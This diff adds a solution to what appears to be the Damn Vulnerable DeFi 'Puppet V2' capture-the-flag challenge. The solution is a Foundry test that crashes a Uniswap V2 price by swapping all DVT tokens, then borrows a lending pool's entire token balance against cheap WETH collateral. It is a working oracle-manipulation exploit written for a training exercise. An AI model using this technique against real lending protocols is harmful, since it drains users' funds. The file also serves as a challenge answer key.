@@ -98,7 +98,34 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+        // Approve router to spend our DVT
+        token.approve(address(uniswapV2Router), type(uint256).max);
         
+        // Create path for swap
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        // Swap all DVT for WETH through Uniswap to manipulate price
+        uniswapV2Router.swapExactTokensForETH(
+            token.balanceOf(player), // all our DVT
+            0, // accept any amount of ETH
+            path,
+            player, // receive ETH here
+            block.timestamp
+        );
+
+        weth.deposit{value: player.balance}();
+        // Calculate how much WETH needed to drain pool
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(poolBalance);
+
+        // Approve lending pool to take our WETH
+        weth.approve(address(lendingPool), depositRequired);
+
+        // Borrow all DVT from lending pool
+        lendingPool.borrow(poolBalance);
+        token.transfer(recovery, token.balanceOf(player)); // Send all DVT to recovery address
     }
 
     /**
